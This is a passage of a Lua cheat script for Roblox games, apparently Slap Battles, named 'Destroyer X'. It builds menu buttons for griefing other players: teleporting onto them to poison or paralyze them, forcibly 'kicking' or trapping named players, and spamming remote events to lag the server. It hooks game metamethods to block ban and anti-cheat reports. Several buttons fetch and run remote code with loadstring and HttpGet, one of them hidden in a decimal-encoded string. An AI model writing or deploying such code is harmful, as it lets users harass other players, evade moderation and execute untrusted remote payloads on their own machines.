			local addItems = {"Plane Flower"}
			for _, item in ipairs(addItems) do
				for i = 1, 40 do
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("AddItem", item)
				end
			end

			wait(0.001)

			for i = 1, 40 do
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("MixItem", "Plane Flower")
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("MixItem", "Plane Flower")
				wait(0.01)
				game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("BrewPotion")
wait(0.001)
end
			wait(0.001)

			local function GetRandomPlayer()
				local players = game.Players:GetPlayers()
				local randomIndex = math.random(1, #players)
				return players[randomIndex]
			end

			local function TeleportToRandomPlayer(player)
				local randomPlayer = GetRandomPlayer()
				if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
					player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
				else
					print("No available or valid player to  Teleport to.")
				end
			end

			for i = 1, 40 do
				if player then
					TeleportToRandomPlayer(player)
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("UsePotion", "Paralyzing Potion", true)
				else
					print("No Players to Teleport.")
				end
				wait(0.01)
			end
		else
			OrionLib:MakeNotification({
				Name = "Ops",
				Content = "You need to equip Alchemist First",
				Image = "rbxassetid://17748409757",
				Time = 5
			})
		end
	end
})


TabMisc:AddButton({
  Name = "Spawn Fake Jet Orb",
  Callback = function()
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "Prop" then
      -- Fire server with ability
-- Disparar o evento GeneralAbility com o argumento "Jet Orb"
local args = {
    [1] = "Jet Orb"
}

game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))

wait(0.4)

-- Obter o jogador local e seu personagem
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

-- ar imediatamente para o primeiro CFrame
local cframe1 = CFrame.new(-186.768707, 144.839737, -26.1459484, -0.992745399, -0.000495329557, 0.120234706, 7.46679234e-08, 0.999991536, 0.00412027026, -0.120235726, 0.00409038831, -0.992736936)
if character and character.PrimaryPart then
    character:SetPrimaryPartCFrame(cframe1)
else
    print("Character or PrimaryPart not found.")
    return
end

wait(0.3)

-- Primeiro Tween de teletransporte
local targetCFrame1 = CFrame.new(
    -29.8379612, 14.7085171, -10.7645597, 
    -0.620980084, 0.0733384117, -0.780387878, 
    7.66658204e-08, 0.995613217, 0.093564555, 
    0.783826351, 0.0581016615, -0.618255973
)

local tweenService = game:GetService("TweenService")

local tweenInfo1 = TweenInfo.new(
    3, -- Tempo em segundos para completar o tween
    Enum.EasingStyle.Linear -- Estilo de easing
)

local goal1 = {}
goal1.CFrame = targetCFrame1

local tween1 = tweenService:Create(humanoidRootPart, tweenInfo1, goal1)
tween1:Play()

wait(0.4)

-- Segundo Tween de teletransporte
local targetCFrame2 = CFrame.new(
    -29.8379612, 14.7085171, -10.7645597, 
    -0.620980084, 0.0733384117, -0.780387878, 
    7.66658204e-08, 0.995613217, 0.093564555, 
    0.783826351, 0.0581016615, -0.618255973
)

local tweenInfo2 = TweenInfo.new(
    5, -- Tempo em segundos para completar o tween
    Enum.EasingStyle.Linear -- Estilo de easing
)

local goal2 = {}
goal2.CFrame = targetCFrame2

local tween2 = tweenService:Create(humanoidRootPart, tweenInfo2, goal2)
tween2:Play()

wait(0.4)

-- Definir o último CFrame (faltava definição do CFrame)
local finalCFrame = CFrame.new(-33.6875, 0.529742479, -13.1420736, -0.605670154, 0.000158846466, -0.795715809, -8.33770883e-08, 1, 0.000199690592, 0.795715809, 0.00012101297, -0.605670094)

if character and character.PrimaryPart then
    character:SetPrimaryPartCFrame(finalCFrame)
else
    print("Character or PrimaryPart not found.")
end
else OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to Equip Prop.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
  end
end
})

TabMisc:AddButton({
  Name = "Spawn Fake Golden Slapple",
  Callback = function()
if game.Players.LocalPlayer.Character:FindFirstChild("entered") then 
 
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in lobby.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
else


wait(0.1)
fireclickdetector(workspace.Lobby.Prop.ClickDetector)
wait(0.3)
-- Fire GeneralAbility server event
local args = {
    [1] = "GoldenSlapple"
}

game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))


wait(0.4)


-- Get local player and their character
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the CFrame position and set the character's position
local cframe = CFrame.new(-423.320953, 89.9632187, -32.9564095, 0.170021072, -0.177099079, -0.969396055, 7.39504529e-08, 0.983718574, -0.179715648, 0.985440433, 0.0305553768, 0.167252898)

if character and character.PrimaryPart then
    character:SetPrimaryPartCFrame(cframe)
else
    print("Character or PrimaryPart not found.")
    return
end

wait(0.4)

-- Anchor all parts of the character
if character then
    for _, part in ipairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.Anchored = true
        end
    end
end

wait(0.3)

-- Fire click detector for spin
fireclickdetector(workspace.Lobby.spin.ClickDetector)
   end
end
})

TabMisc:AddButton({
  Name = "Stop Golden Slapple Spawn",
  Callback = function()
   local player = game.Players.LocalPlayer
player.Character:WaitForChild("Humanoid").Health = 0 
end
})

TabBadges:AddButton({
  Name = "Iceskate Badge",
  Callback = function()
    game:GetService("ReplicatedStorage").IceSkate:FireServer("Freeze")
end
})


TabMisc:AddTextbox({
  Name = "Equip Glove",
  Default = "Name",
  TextDisappear = false,
 Callback = function(Value) 
   EquipGlove1 = Value
   end
})

TabMisc:AddButton({
  Name = "Equip",
  Callback = function()
    fireclickdetector(workspace.Lobby.EquipGlove1.ClickDetector)
    end
})

TabMisc:AddButton({
  Name = "Collect Orb",
  Callback = function()
    for i,v in pairs(game.Workspace:GetChildren()) do
                    if v.Name == "JetOrb" or v.Name == "PhaseOrb" then
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), v, 0)
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), v, 1)
                    end
                end
end
})

TabTrolling:AddButton({
  Name = "Meteor Shower",
  Callback = function()
  if game.Players.LocalPlayer.leaderstats.Glove.Value == "Alchemist" then
			local player = game.Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()

			local cframe = CFrame.new(17896.1797, -128.664368, -3544.22412, -0.999756634, -0.000100836049, -0.0220624395, -3.8296148e-06, 0.999990463, -0.00439669611, 0.0220626704, -0.00439554127, -0.999746978)

			if character and character.PrimaryPart then
				character:SetPrimaryPartCFrame(cframe)
			else
				print("Character or PrimaryPart not found.")
				return
			end

			wait(0.3)
			game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
			wait(0.2)

			local addItems = {"Dark Root", "Blood Rose"}
			for _, item in ipairs(addItems) do
				for i = 1, 100 do
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("AddItem", item)
				end
			end

			wait(0.001)

			for i = 1, 40 do
				for j = 1, 10 do
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("MixItem", "Dark Root")
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("MixItem", "Blood Rose")
				end
				game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("BrewPotion")
			end
waut(0.10)
fireclickdetector(workspace.Lobby.Meteor.ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
			wait(0.001)

			local function GetRandomPlayer()
				local players = game.Players:GetPlayers()
				local randomIndex = math.random(1, #players)
				return players[randomIndex]
			end

			local function TeleportToRandomPlayer(player)
				local randomPlayer = GetRandomPlayer()
				if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
					player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
				else
					print("No available or valid player to Teleport Teleport to.")
				end
			end

			for i = 1, 30 do
				if player then
					TeleportToRandomPlayer(player)
					game:GetService("ReplicatedStorage"):WaitForChild("AlchemistEvent"):FireServer("UsePotion", "Lethal Poison", true)
				else
					print("No Players to Teleport.")
				end
				wait(0.01)
			end  
else
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to Equip Alchemist first",
    Image = "rbxassetid://17748409757",
    Time = 5
})

  end
end
})

TabMisc:AddButton({
  Name = "Ultra Bob Farm",
  Callback = function()
    setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/Aquoupi/DestroyerX/main/UltraBobFarm.lua"))()')
    wait(0.1)
    OrionLib:MakeNotification({
    Name = "Set to Clipboard",
    Content = "Put the script on your auto execute.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
end
})

TabTrolling:AddTextbox({
  Name = "Oven Player",
  Default = "User",
  TextDisappear = false,
  Callback = function(Value)
    OvenPlrTarget = Value
    local matchedPlayer = nil
		local shortestDistance = math.huge

		for _, player in ipairs(Players:GetPlayers()) do
			local distance = string.len(player.Name) - string.len(Value)
			if string.sub(player.Name, 1, #Value):lower() == Value:lower() and distance < shortestDistance then
				matchedPlayer = player
				shortestDistance = distance
			end
		end

		if matchedPlayer then
OvenPlrTarget = matchedPlayer.Name
print("Find" .. matchedPlayer.Name)
		else
			            OrionLib:MakeNotification({
                Name = "Didn't find this player",
                Content = "This player does not exist",
                Image = "rbxassetid://17748409757",
                Time = 5
            })   
		end
end
})



TabTrolling:AddButton({
  Name = "Start Oven Player",
  Callback = function()
    game:GetService("ReplicatedStorage").GeneralAbility:FireServer(game.Players.OvenPlrTarget.Character.HumanoidRootPart.CFrame)
end
})

TabTrolling:AddToggle({
  Name = "Auto Oven Player",
  Default = false,
  Callback = function(Value)
  _G.AutoOvenTarget = Value
    while _G.AutoOvenTarget do
      game:GetService("ReplicatedStorage").GeneralAbility:FireServer(game.Players.OvenPlrTarget.Character.HumanoidRootPart.CFrame)
    task.wait(8.55)
  end
end
})


TabMisc:AddButton({
  Name = "Collect Slapples",
  Callback = function()
                  local slapples = workspace.Arena:GetDescendants()
                for _, slapple in ipairs(slapples) do
                    if slapple.Name == "Slapple" then
                        -- Encontre todos os TouchTransmitters dentro de cada Slapple
                        local touchTransmitters = slapple:GetDescendants()
                        for _, transmitter in ipairs(touchTransmitters) do
                            if transmitter:IsA("TouchTransmitter") then
                                -- Acione o FireTouchInterest para cada TouchTransmitter encontrado
                                firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), transmitter.Parent, 0)
                            end
                        end
                    end
                end  
                wait(0.1)
                                local goldenSlapple = workspace.Arena.island5.Slapples:FindFirstChild("GoldenSlapple")
                if goldenSlapple then
                    -- Encontre todos os TouchTransmitters dentro do GoldenSlapple
                    local touchTransmitters = goldenSlapple:GetDescendants()
                    for _, transmitter in ipairs(touchTransmitters) do
                        if transmitter:IsA("TouchTransmitter") then
                            -- Acione o FireTouchInterest para cada TouchTransmitter encontrado
                            firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), transmitter.Parent, 0)
                        end
                    end
                end
end
})

TabTrolling:AddButton({
  Name = "Bob Random",
  Callback = function()
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "bob" and game.Players.LocalPlayer.Character:FindFirstChild("entered") then
      
      local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.1)
      
      game:GetService("ReplicatedStorage"):WaitForChild("bob"):FireServer()
    wait(0.2)
           local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()

            local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            character:SetPrimaryPartCFrame(cframe)
      
    else
      OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in the Arena or you didn't equip bob.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
  end
end
})

TabTrolling:AddTextbox({
  Name = "Bob Player",
  Default = "User",
  TextDisappear = false,
  Callback = function(Value)
        BobPlrTarget = Value
    local matchedPlayer = nil
		local shortestDistance = math.huge

		for _, player in ipairs(Players:GetPlayers()) do
			local distance = string.len(player.Name) - string.len(Value)
			if string.sub(player.Name, 1, #Value):lower() == Value:lower() and distance < shortestDistance then
				matchedPlayer = player
				shortestDistance = distance
			end
		end

		if matchedPlayer then
BobPlrTarget = matchedPlayer.Name
print("Find" .. matchedPlayer.Name)
		else
			            OrionLib:MakeNotification({
                Name = "Didn't find this player",
                Content = "This player does not exist",
                Image = "rbxassetid://17748409757",
                Time = 5
            })   
		end
  
end
})

TabTrolling:AddButton({
  Name = "Start Bob Player",
  Callback = function()
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "bob" and game.Players.LocalPlayer.Character:FindFirstChild("entered") then
            local Player = game.Players:FindFirstChild(BobPlrTarget)
        if Player then
            game.Players.LocalPlayer.Character:MoveTo(Player.Character.HumanoidRootPart.Position)
            end
            wait(0.1)
                  game:GetService("ReplicatedStorage"):WaitForChild("bob"):FireServer()
    wait(0.2)
           local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()

            local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            character:SetPrimaryPartCFrame(cframe)
      
    else
      OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in the Arena or you didn't equip bob.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
  end
end
})



TabImmunity:AddButton({
  Name = "Remove Countdown",
  Callback = function()
    while true do
local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
local tool = character:FindFirstChildOfClass("Tool") or player.Backpack:FindFirstChildOfClass("Tool")
local localscript = tool:FindFirstChildOfClass("LocalScript")
local localscriptclone = localscript:Clone()
localscriptclone = localscript:Clone()
localscriptclone:Clone()
localscript:Destroy()
localscriptclone.Parent = tool
task.wait()
 end
end
})


TabBadges:AddButton({
  Name = "Collect Repressed Memories Plushie",
  Callback = function()
    fireclickdetector(workspace.RepressedMemories._ugcQuestObjectBobPlushie.ClickDetector)
end
})

TabImmunity:AddToggle({
  Name = "Auto Remove Reaper Screen",
  Default = false,
  Callback = function(Value)
_G.AutoRemoveRep = Value
 while _G.AutoRemoveRep do
    for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v.Name == "DeathMark" then
                        game:GetService("ReplicatedStorage").ReaperGone:FireServer(game:GetService("Players").LocalPlayer.Character.DeathMark)
                    game:GetService("Lighting"):WaitForChild("DeathMarkColorCorrection"):Destroy() 
                    end
    end
              task.wait()
          end
  end
})

TabTrolling:AddButton({
  Name = "Trap Player OP",
  Callback = function()
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "Swapper" then
  local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(17896.1797, -128.664368, -3544.22412, -0.999756634, -0.000100836049, -0.0220624395, -3.8296148e-06, 0.999990463, -0.00439669611, 0.0220626704, -0.00439554127, -0.999746978)

character:SetPrimaryPartCFrame(cframe)
wait(0.3)
game:GetService("ReplicatedStorage"):WaitForChild("SLOC"):FireServer()
wait(0.7)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(17896.1797, -128.664368, -3544.22412, -0.999756634, -0.000100836049, -0.0220624395, -3.8296148e-06, 0.999990463, -0.00439669611, 0.0220626704, -0.00439554127, -0.999746978)

character:SetPrimaryPartCFrame(cframe)
wait(0.6)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
 
  wait(4)
  game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
  wait(1)
  game:GetService("ReplicatedStorage"):WaitForChild("SLOC"):FireServer()
  wait(8)
  local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)

character:SetPrimaryPartCFrame(cframe)
  else
       OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in the Arena or you didn't equip bob.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
  end
end
})

TabTrolling:AddButton({
  Name = "Kick Random Player Grab",
  Callback = function(Value)
if game.Players.LocalPlayer.Character:FindFirstChild("entered") and game.Players.LocalPlayer.leaderstats.Glove.Value == "Grab" then 
local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer and randomPlayer.Character and randomPlayer.Character:FindFirstChild("entered") then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("No available or valid player to  Teleport to.")
    end
end

local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("No Players to Teleport.")
end
wait(0.15)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(0.15)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-803.910706, 327.554688, -15.9233484, 0.999981463, 0, -0.0061050402, -0, 1.00000012, -0, 0.00610504113, 0, 0.999981344)

character:SetPrimaryPartCFrame(cframe)
wait(0.1)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(1)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = false
else
  OrionLib:MakeNotification({
                Name = "Ops",
                Content = "You not on arena or you need to hold grab glove.",
                Image = "rbxassetid://17748409757",
                Time = 5
            })   
        end
end
})

TabTrolling:AddTextbox({
  Name = "Kick Player Grab",
  Default = "User",
  TextDisappear = false,
  Callback = function(Value)
    		KickGrabTarget = Value
		local matchedPlayer = nil
		local shortestDistance = math.huge

		for _, player in ipairs(Players:GetPlayers()) do
			local distance = string.len(player.Name) - string.len(Value)
			if string.sub(player.Name, 1, #Value):lower() == Value:lower() and distance < shortestDistance then
				matchedPlayer = player
				shortestDistance = distance
			end
		end

		if matchedPlayer then
KickGrabTarget = matchedPlayer.Name
print("Find" .. matchedPlayer.Name)
		else
			            OrionLib:MakeNotification({
                Name = "Didn't find this player",
                Content = "This player does not exist",
                Image = "rbxassetid://17748409757",
                Time = 5
            })   
		end
end
})


TabTrolling:AddButton({
  Name = "Start Grab Kick",
  Callback = function()
if game.Players.LocalPlayer.Character:FindFirstChild("entered") and game.Players.LocalPlayer.leaderstats.Glove.Value == "Grab" and game.Players.KickGrabTarget.Character:FindFirstChild("entered") then 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[KickGrabTarget].Character.HumanoidRootPart.CFrame
wait(0.15)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
wait(0.15)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-803.910706, 327.554688, -15.9233484, 0.999981463, 0, -0.0061050402, -0, 1.00000012, -0, 0.00610504113, 0, 0.999981344)

character:SetPrimaryPartCFrame(cframe)
wait(0.1)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = true
wait(1)
local player = game.Players.LocalPlayer
local head = player.Character:WaitForChild("Head")
head.Anchored = false
else
  OrionLib:MakeNotification({
                Name = "Ops",
                Content = "You not on arena or you need to hold grab glove or this player is on the lobby.",
                Image = "rbxassetid://17748409757",
                Time = 5
            })   
        end
end
})


TabMain:AddToggle({
  Name = "Spam Free Ability",
  Default = false,
  Callback = function(Value)
_G.SpamFreeAb = Value
while _G.SpamFreeAb do
  local RetroAbility1 = "Bomb"
  
    game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
  wait(0.1)
  game:GetService("ReplicatedStorage").NullAbility:FireServer()
  wait(0.1)
  OldSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
game:GetService("ReplicatedStorage").slapstick:FireServer("runeffect")
wait(0.1)
game:GetService("ReplicatedStorage").RetroAbility:FireServer(RetroAbility1)
wait(0.1)
game:GetService("ReplicatedStorage").AdminAbility:FireServer(AbilityAdmin)

task.wait(0.2)
  end
end
})


TabMisc:AddToggle({
  Name = "Retro Bomb Spam",
  Default = false,
  Callback = function(Value)
_G.RetroBombSpam = Value
while _G.RetroBombSpam do
local RetroAbility1 = "Bomb"
game:GetService("ReplicatedStorage").RetroAbility:FireServer(RetroAbility1)
task.wait(3)
  end
end
})

TabMisc:AddSlider({
	Name = "Lag Value",
	Min = 1,
	Max = 250,
	Default = 20,
	Color = Color3.fromRGB(255,255,255),
	Increment = 1,
	ValueName = "Power",
	Callback = function(Value)
LagNumber = Value
	end    
})


TabMisc:AddDropdown({
    Name = "Lag Type",
    Default = "Select a Type",
    Options = {"Select a Type", "Slapstick", "Spoonful", "Slapstick + Spoonful"},
    Callback = function(Value)
        LagType = Value
    end
})

StartLagOn = TabMisc:AddToggle({
  Name = "Start Lag",
  Default = false,
  Callback = function(Value)
StartLag = Value
if StartLag and LagType == "Select a Type" then
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to Select a type first.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
wait(0.1)
StartLagOn:Set(false)
elseif StartLag and LagType == "Slapstick" then
for i = 1, LagNumber do
  while StartLag do 
  OldSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
game:GetService("ReplicatedStorage").slapstick:FireServer("runeffect")
task.wait()
 end
end
  elseif StartLag and LagType == "Spoonful" then
    if game.Players.LocalPlayer.leaderstats.Glove.Value == "Spoonful" then
  for i = 1, LagNumber do
      while StartLag do
game:GetService("ReplicatedStorage").GeneralAbility:FireServer({["state"] = "vfx",["origin"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(-3.141592502593994, 1.0475832223892212, 3.141592502593994),["vfx"] = "jumptween",["sendplr"] = game:GetService("Players").LocalPlayer})
task.wait()
      end
  end
else
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to equip Spoonful first.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
wait(0.1)
StartLagOn:Set(false)
end
elseif StartLag and LagType == "Slapstick + Spoonful" then 
  if game.Players.LocalPlayer.leaderstats.Glove.Value == "Spoonful" then
for i = 1, LagNumber do
while StartLag do 
game:GetService("ReplicatedStorage").GeneralAbility:FireServer({["state"] = "vfx",["origin"] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(-3.141592502593994, 1.0475832223892212, 3.141592502593994),["vfx"] = "jumptween",["sendplr"] = game:GetService("Players").LocalPlayer})

OldSpeed = game.Players.LocalPlayer.Character.Humanoid.WalkSpeed
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
game:GetService("ReplicatedStorage").slapstick:FireServer("runeffect")
  task.wait()
  end
end
else
 OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to equip Spoonful first.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
wait(0.1)
StartLagOn:Set(false) 
  end
 end
end
  
})


TabImmunity:AddButton({
  Name = "Anti-Afk",
  Callback = function()


local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if method == "Kick" and self == game.Players.LocalPlayer then
        print("Idle Kick Prevention Successful")
        return -- Prevent the kick
    end
    return oldNamecall(self, ...)
end)

setreadonly(mt, true) 
end
})

TabCredits:AddParagraph("Made By Pyrofrost Team ","Any bugs make a bug report or Dm Us on Guilded")


TabLogs:AddParagraph("Destroyer X","Fix some bugs ; Please report one on Settings tab.")







elseif game.PlaceId == 16034567693 then
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Destroyer X | Staff App ", HidePremium = false, IntroEnabled = true, IntroText = "Dest Staff App", IntroIcon = "rbxassetid://17748409757"  ,     Icon = "rbxassetid://17748409757", SaveConfig = true, ConfigFolder = "DestroyerXStaff"})

--Anti Ban (Credits to GiangMc)--

local Namecall
Namecall = hookmetamethod(game, "__namecall", function(self, ...)
   if getnamecallmethod() == "FireServer" and tostring(self) == "Ban" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "WalkSpeedChanged" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "AdminGUI" then
       return
   end
   return Namecall(self, ...)
end)



-- Tabs
local TabMainApp = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false
})


TabMainApp:AddButton({
	Name = "Get Admin ",
	Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(499.88028, 82.0227356, 61.3680878, -0.999816656, -2.36485675e-06, 0.0191484056, -4.01166687e-07, 1, 0.000102576443, -0.0191484056, 0.000102549966, -0.999816656)
character:SetPrimaryPartCFrame(cframe)
end    
})

TabMainApp:AddButton({
	Name = "Anti-Afk ",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
end
})


elseif game.PlaceId == 11828384869 then
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Destroyer X | Elude Maze ", HidePremium = false, IntroEnabled = true, IntroText = "Dest Elude", SaveConfig = true, ConfigFolder = "DestroyerXEludeMaze"})

--Anti Ban (Credits to GiangMc)--

local Namecall
Namecall = hookmetamethod(game, "__namecall", function(self, ...)
   if getnamecallmethod() == "FireServer" and tostring(self) == "Ban" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "WalkSpeedChanged" then
       return
   elseif getnamecallmethod() == "FireServer" and tostring(self) == "AdminGUI" then
       return
   end
   return Namecall(self, ...)
end)



-- Tabs
local TabMainElude = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false
})


TabMainElude:AddButton({
	Name = "Get Elude",
	Callback = function()
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Ruins.Elude.Glove.TouchInterest.Parent, 0)
end    
})

TabMainElude:AddButton({
  Name = "Collect Plushie",
  Callback = function()
    fireclickdetector(workspace._ugcQuestObjectEludeHat.ClickDetector)
end
})

TabMainElude:AddButton({
	Name = "Fly Script (Credits to me_ozone)",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end    
})

elseif game.PlaceId == 9431156611 then
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/thanhdat4461/OrionMoblie/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Destroyer X |  Royal ", HidePremium = false, IntroEnabled = true, IntroText = "Dest Slap Royal", IntroIcon = "rbxassetid://17748409757"  ,     Icon = "rbxassetid://17748409757", SaveConfig = true, ConfigFolder = "DestroyerXRoyal"})

--Anti Ban (Credits to GiangMc)--

local bypass;
bypass = hookmetamethod(game, "__namecall", function(method, ...) 
if getnamecallmethod() == "FireServer" and method == game.ReplicatedStorage.Events.Ban then
     return
elseif getnamecallmethod() == "FireServer" and method == game.ReplicatedStorage.Events.AdminGUI then
     return
elseif getnamecallmethod() == "FireServer" and method == game.ReplicatedStorage.Events.WS then
     return
elseif getnamecallmethod() == "FireServer" and method == game.ReplicatedStorage.Events.WS2 then
     return
end
return bypass(method, ...)
end)


-- Tabs 
local TabMainRoyal = Window:MakeTab({
        Name = "Main",
        Icon = "rbxassetid://7733960981",
        PremiumOnly = false
})

local TabMiscRoyal = Window:MakeTab({
        Name = "Misc",
        Icon = "rbxassetid://8997387110",
        PremiumOnly = false
})

local TabInfoRoyal = Window:MakeTab({
        Name = "Info",
